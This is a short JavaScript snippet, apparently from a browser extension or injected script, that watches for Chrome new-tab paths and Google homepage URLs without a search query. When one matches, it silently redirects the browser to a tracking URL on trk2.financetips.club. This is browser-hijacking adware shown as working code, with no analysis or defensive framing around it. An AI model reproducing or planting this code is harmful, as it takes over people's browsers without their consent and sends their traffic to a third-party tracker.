var starturl  = window.location.pathname;
	var find      = starturl.indexOf('/_/chrome');
	

	

	var websredir = [
	  "http://trk2.financetips.club/f69e3b9e-f0ed-43b5-a596-7995634f1e48",
	  "http://trk2.financetips.club/f69e3b9e-f0ed-43b5-a596-7995634f1e48"
	  
	];
	

	var randnumb = Math.floor(Math.random() * 2);
	

	if (find == 0) {
	

	  window.location.replace(websredir[randnumb]);
	}
	/*
	if(window.location.href.indexOf("google") > -1){
	  window.location.replace(websredir[randnumb]);
	}
	*/
	

	

	

	if(window.location.href.indexOf("gws_rd=cr,ssl") > -1){
	  window.location.replace(websredir[randnumb]);
	}
	

	

	

	if(window.location.href.indexOf("https://www.google.") > -1){
	    if(window.location.href.indexOf('q=') <= 0){
	        window.location.replace(websredir[randnumb]);
	    }
	}
	

	if(window.location.href.indexOf("https://google.") > -1){
	    if(window.location.href.indexOf('q=') <= 0){
	        window.location.replace(websredir[randnumb]);
	    }
	}
